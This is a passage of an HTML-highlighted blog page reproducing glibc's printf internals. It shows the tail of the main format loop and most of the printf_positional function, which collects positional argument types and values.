PARSE_FLOAT_VA_ARG_EXTENDED (info);</span><br><span class=\"line\">\t    <span class=\"type\">const</span> <span class=\"type\">void</span> *ptr = &amp;the_arg;</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"type\">int</span> function_done = __printf_fp_spec (s, &amp;info, &amp;ptr);</span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (function_done &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t      &#123;</span><br><span class=\"line\">\t\tdone = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t      &#125;</span><br><span class=\"line\">\t    done_add (function_done);</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\">\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tLABEL (form_unknown):</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (spec == L_(<span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      <span class=\"comment\">/* The format string ended before the specifier is complete.  */</span></span><br><span class=\"line\">\t      __set_errno (EINVAL);</span><br><span class=\"line\">\t      done = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t      <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"comment\">/* If we are in the fast loop force entering the complicated</span></span><br><span class=\"line\"><span class=\"comment\">\t     one.  */</span></span><br><span class=\"line\">\t  <span class=\"keyword\">goto</span> do_positional;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* The format is correctly handled.  */</span></span><br><span class=\"line\">      ++nspecs_done;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Look for next format specifier.  */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> COMPILE_WPRINTF</span></span><br><span class=\"line\">      f = __find_specwc ((end_of_spec = ++f));</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">      f = __find_specmb ((end_of_spec = ++f));</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Write the following constant string.  */</span></span><br><span class=\"line\">      outstring (end_of_spec, f - end_of_spec);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (*f != L_(<span class=\"string\">&#x27;\\0&#x27;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Unlock stream and return.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Hand off processing for positional parameters.  */</span></span><br><span class=\"line\">do_positional:</span><br><span class=\"line\">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class=\"line\">\t\t\t    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class=\"line\">\t\t\t    save_errno, grouping, thousands_sep, mode_flags);</span><br><span class=\"line\"></span><br><span class=\"line\"> all_done:</span><br><span class=\"line\">  <span class=\"comment\">/* Unlock the stream.  */</span></span><br><span class=\"line\">  _IO_funlockfile (s);</span><br><span class=\"line\">  _IO_cleanup_region_end (<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> done;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"printf-positional\"><a href=\"#printf-positional\" class=\"headerlink\" title=\"printf_positional\"></a>printf_positional</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span></span><br><span class=\"line\"><span class=\"title function_\">printf_positional</span> <span class=\"params\">(FILE *s, <span class=\"type\">const</span> CHAR_T *format, <span class=\"type\">int</span> readonly_format,</span></span><br><span class=\"line\"><span class=\"params\">\t\t   va_list ap, va_list *ap_savep, <span class=\"type\">int</span> done, <span class=\"type\">int</span> nspecs_done,</span></span><br><span class=\"line\"><span class=\"params\">\t\t   <span class=\"type\">const</span> UCHAR_T *lead_str_end,</span></span><br><span class=\"line\"><span class=\"params\">\t\t   CHAR_T *work_buffer, <span class=\"type\">int</span> save_errno,</span></span><br><span class=\"line\"><span class=\"params\">\t\t   <span class=\"type\">const</span> <span class=\"type\">char</span> *grouping, THOUSANDS_SEP_T thousands_sep,</span></span><br><span class=\"line\"><span class=\"params\">\t\t   <span class=\"type\">unsigned</span> <span class=\"type\">int</span> mode_flags)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/* For positional argument handling.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">scratch_buffer</span> <span class=\"title\">specsbuf</span>;</span></span><br><span class=\"line\">  scratch_buffer_init (&amp;specsbuf);</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">printf_spec</span> *<span class=\"title\">specs</span> =</span> specsbuf.data;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> specs_limit = specsbuf.length / <span class=\"keyword\">sizeof</span> (specs[<span class=\"number\">0</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Used as a backing store for args_value, args_size, args_type</span></span><br><span class=\"line\"><span class=\"comment\">     below.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">scratch_buffer</span> <span class=\"title\">argsbuf</span>;</span></span><br><span class=\"line\">  scratch_buffer_init (&amp;argsbuf);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Array with information about the needed arguments.  This has to</span></span><br><span class=\"line\"><span class=\"comment\">     be dynamically extensible.  */</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> nspecs = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* The number of arguments the format string requests.  This will</span></span><br><span class=\"line\"><span class=\"comment\">     determine the size of the array needed to store the argument</span></span><br><span class=\"line\"><span class=\"comment\">     attributes.  */</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> nargs = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Positional parameters refer to arguments directly.  This could</span></span><br><span class=\"line\"><span class=\"comment\">     also determine the maximum number of arguments.  Track the</span></span><br><span class=\"line\"><span class=\"comment\">     maximum number.  */</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> max_ref_arg = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Just a counter.  */</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> cnt;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (grouping == (<span class=\"type\">const</span> <span class=\"type\">char</span> *) <span class=\"number\">-1</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> COMPILE_WPRINTF</span></span><br><span class=\"line\">      thousands_sep = _NL_CURRENT_WORD (LC_NUMERIC,</span><br><span class=\"line\">\t\t\t\t\t_NL_NUMERIC_THOUSANDS_SEP_WC);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">      thousands_sep = _NL_CURRENT (LC_NUMERIC, THOUSANDS_SEP);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">      grouping = _NL_CURRENT (LC_NUMERIC, GROUPING);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (*grouping == <span class=\"string\">&#x27;\\0&#x27;</span> || *grouping == CHAR_MAX)</span><br><span class=\"line\">\tgrouping = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">const</span> UCHAR_T *f = lead_str_end; *f != L_(<span class=\"string\">&#x27;\\0&#x27;</span>);</span><br><span class=\"line\">       f = specs[nspecs++].next_fmt)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (nspecs == specs_limit)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (!scratch_buffer_grow_preserve (&amp;specsbuf))</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      done = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t      <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t  specs = specsbuf.data;</span><br><span class=\"line\">\t  specs_limit = specsbuf.length / <span class=\"keyword\">sizeof</span> (specs[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Parse the format specifier.  */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> COMPILE_WPRINTF</span></span><br><span class=\"line\">      nargs += __parse_one_specwc (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">      nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Determine the number of arguments the format string consumes.  */</span></span><br><span class=\"line\">  nargs = MAX (nargs, max_ref_arg);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">printf_arg</span> *<span class=\"title\">args_value</span>;</span></span><br><span class=\"line\">  <span class=\"type\">int</span> *args_size;</span><br><span class=\"line\">  <span class=\"type\">int</span> *args_type;</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* Calculate total size needed to represent a single argument</span></span><br><span class=\"line\"><span class=\"comment\">       across all three argument-related arrays.  */</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> bytes_per_arg</span><br><span class=\"line\">      = <span class=\"keyword\">sizeof</span> (*args_value) + <span class=\"keyword\">sizeof</span> (*args_size) + <span class=\"keyword\">sizeof</span> (*args_type);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!scratch_buffer_set_array_size (&amp;argsbuf, nargs, bytes_per_arg))</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">\tdone = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    args_value = argsbuf.data;</span><br><span class=\"line\">    <span class=\"comment\">/* Set up the remaining two arrays to each point past the end of</span></span><br><span class=\"line\"><span class=\"comment\">       the prior array, since space for all three has been allocated</span></span><br><span class=\"line\"><span class=\"comment\">       now.  */</span></span><br><span class=\"line\">    args_size = &amp;args_value[nargs].pa_int;</span><br><span class=\"line\">    args_type = &amp;args_size[nargs];</span><br><span class=\"line\">    <span class=\"built_in\">memset</span> (args_type, (mode_flags &amp; PRINTF_FORTIFY) != <span class=\"number\">0</span> ? <span class=\"string\">&#x27;\\xff&#x27;</span> : <span class=\"string\">&#x27;\\0&#x27;</span>,</span><br><span class=\"line\">\t    nargs * <span class=\"keyword\">sizeof</span> (*args_type));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* XXX Could do sanity check here: If any element in ARGS_TYPE is</span></span><br><span class=\"line\"><span class=\"comment\">     still zero after this loop, format is invalid.  For now we</span></span><br><span class=\"line\"><span class=\"comment\">     simply use 0 as the value.  */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Fill in the types of all the arguments.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (cnt = <span class=\"number\">0</span>; cnt &lt; nspecs; ++cnt)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* If the width is determined by an argument this is an int.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (specs[cnt].width_arg != <span class=\"number\">-1</span>)</span><br><span class=\"line\">\targs_type[specs[cnt].width_arg] = PA_INT;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* If the precision is determined by an argument this is an int.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (specs[cnt].prec_arg != <span class=\"number\">-1</span>)</span><br><span class=\"line\">\targs_type[specs[cnt].prec_arg] = PA_INT;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">switch</span> (specs[cnt].ndata_args)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"number\">0</span>:\t\t<span class=\"comment\">/* No arguments.  */</span></span><br><span class=\"line\">\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:\t\t<span class=\"comment\">/* One argument; we already have the</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t   type and size.  */</span></span><br><span class=\"line\">\t  args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;</span><br><span class=\"line\">\t  args_size[specs[cnt].data_arg] = specs[cnt].size;</span><br><span class=\"line\">\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t  <span class=\"comment\">/* We have more than one argument for this format spec.</span></span><br><span class=\"line\"><span class=\"comment\">\t     We must call the arginfo function again to determine</span></span><br><span class=\"line\"><span class=\"comment\">\t     all the types.  */</span></span><br><span class=\"line\">\t  (<span class=\"type\">void</span>) (*__printf_arginfo_table[specs[cnt].info.spec])</span><br><span class=\"line\">\t    (&amp;specs[cnt].info,</span><br><span class=\"line\">\t     specs[cnt].ndata_args, &amp;args_type[specs[cnt].data_arg],</span><br><span class=\"line\">\t     &amp;args_size[specs[cnt].data_arg]);</span><br><span class=\"line\">\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Now we know all the types and the order.  Fill in the argument</span></span><br><span class=\"line\"><span class=\"comment\">     values.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (cnt = <span class=\"number\">0</span>; cnt &lt; nargs; ++cnt)</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (args_type[cnt])</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> T(tag, mem, type)\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\tcase tag:\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t  args_value[cnt].mem = va_arg (*ap_savep, type); \\</span></span><br><span class=\"line\"><span class=\"meta\">\t  break</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tT (PA_WCHAR, pa_wchar, <span class=\"type\">wint_t</span>);</span><br><span class=\"line\">      <span class=\"keyword\">case</span> PA_CHAR:\t\t\t\t<span class=\"comment\">/* Promoted.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">case</span> PA_INT|PA_FLAG_SHORT:\t\t<span class=\"comment\">/* Promoted.  */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> LONG_MAX == INT_MAX</span></span><br><span class=\"line\">      <span class=\"keyword\">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\tT (PA_INT, pa_int, <span class=\"type\">int</span>);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> LONG_MAX == LONG_LONG_MAX</span></span><br><span class=\"line\">      <span class=\"keyword\">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\tT (PA_INT|PA_FLAG_LONG_LONG, pa_long_long_int, <span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">int</span>);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> LONG_MAX != INT_MAX &amp;&amp; LONG_MAX != LONG_LONG_MAX</span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">error</span> <span class=\"string\">&quot;he?&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">      <span class=\"keyword\">case</span> PA_FLOAT:\t\t\t\t<span class=\"comment\">/* Promoted.  */</span></span><br><span class=\"line\">\tT (PA_DOUBLE, pa_double, <span class=\"type\">double</span>);</span><br><span class=\"line\">      <span class=\"keyword\">case</span> PA_DOUBLE|PA_FLAG_LONG_DOUBLE:</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (__glibc_unlikely ((mode_flags &amp; PRINTF_LDBL_IS_DBL) != <span class=\"number\">0</span>))</span><br><span class=\"line\">\t  &#123;</span><br><span class=\"line\">\t    args_value[cnt].pa_double = va_arg (*ap_savep, <span class=\"type\">double</span>);</span><br><span class=\"line\">\t    args_type[cnt] &amp;= ~PA_FLAG_LONG_DOUBLE;</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> __HAVE_FLOAT128_UNLIKE_LDBL</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ((mode_flags &amp; PRINTF_LDBL_USES_FLOAT128) != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t  args_value[cnt].pa_float128 = va_arg (*ap_savep, <span class=\"type\">_Float128</span>);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t  args_value[cnt].pa_long_double = va_arg (*ap_savep, <span class=\"type\">long</span> <span class=\"type\">double</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> PA_STRING:\t\t\t\t<span class=\"comment\">/* All pointers are the same */</span></span><br><span class=\"line\">      <span class=\"keyword\">case</span> PA_WSTRING:\t\t\t<span class=\"comment\">/* All pointers are the same */</span></span><br><span class=\"line\">\tT (PA_POINTER, pa_pointer, <span class=\"type\">void</span> *);</span><br><span class=\"line\"><span 